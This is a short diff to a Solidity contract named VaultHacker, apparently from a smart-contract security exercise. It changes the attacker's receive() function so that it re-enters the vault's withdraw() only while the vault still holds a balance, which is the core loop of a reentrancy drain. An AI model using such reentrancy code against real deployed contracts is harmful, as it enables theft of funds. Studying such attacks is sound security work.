@@ -23,6 +23,8 @@ contract VaultHacker {
     }
 
     receive() external payable {
-        Vault(vault).withdraw();
+        if (vault.balance > 0) {
+            Vault(vault).withdraw();
+        }
     }
 }
